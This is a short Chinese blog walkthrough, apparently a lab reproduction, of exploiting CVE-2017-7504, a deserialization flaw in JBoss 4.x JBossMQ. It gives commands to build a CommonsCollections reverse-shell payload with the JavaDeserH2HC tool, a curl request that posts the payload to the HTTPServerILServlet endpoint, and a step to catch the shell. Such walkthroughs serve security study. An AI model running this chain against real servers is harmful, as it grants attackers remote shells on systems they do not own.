# JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504） - jiecoll - 博客园

> 原文：[`www.cnblogs.com/jiecoll/p/14191717.html`](https://www.cnblogs.com/jiecoll/p/14191717.html)

1。搭建环境

![](img/afcfd5be8403c2cb2f5a34e0cf54159d.png)

 2.直接用工具拿 shell

![](img/ce9a000b153893893487f2e98b5afc6b.png)

2，另一个工具的利用

下载地址：

*   [`github.com/joaomatosf/JavaDeserH2HC`](https://github.com/joaomatosf/JavaDeserH2HC)

3.解压打开

![](img/5bdf7a957d945df72e79d351fe2d62a9.png)

 4.执行命令

javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java

java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap ip:端口

![](img/81a7a7f3993ebef906baf333865d12ad.png)

curl http://192.168.33.144:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser

![](img/4cb29ea9b7bc0b73f5ce47c5f3aa3871.png)

 监听端口反弹 shell

![](img/b7329d3a15c1bbbb4bc04332dc9ccbc9.png)